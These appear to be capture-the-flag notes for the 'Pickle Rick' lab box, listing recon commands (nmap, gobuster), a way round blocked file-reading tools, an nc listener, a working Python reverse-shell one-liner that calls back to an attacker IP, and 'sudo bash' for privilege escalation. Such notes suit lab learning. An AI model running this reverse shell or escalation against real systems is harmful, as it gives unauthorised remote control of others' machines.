# Challenge Name: Pickle Rick
Ip Address: http://10.10.89.68/

# Use Nmap 
nmap -sC -sV -oN nmap/initial 10.10.89.68

# Use go buster
gobuster dir -u http://10.10.89.68 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,py


# We can use less to read a file if cat,vim,vi,nano are in the block list
less <filename>.<extension> or grep -R .

# Checking if there is a python installed in the target box
python3 -c 'print("Hello WOrld")'

# Listen of the incoming connection
nc -lnvp 8888

# Use Python Reverseshell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.58.221",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


# Privilege escalation 

sudo bash

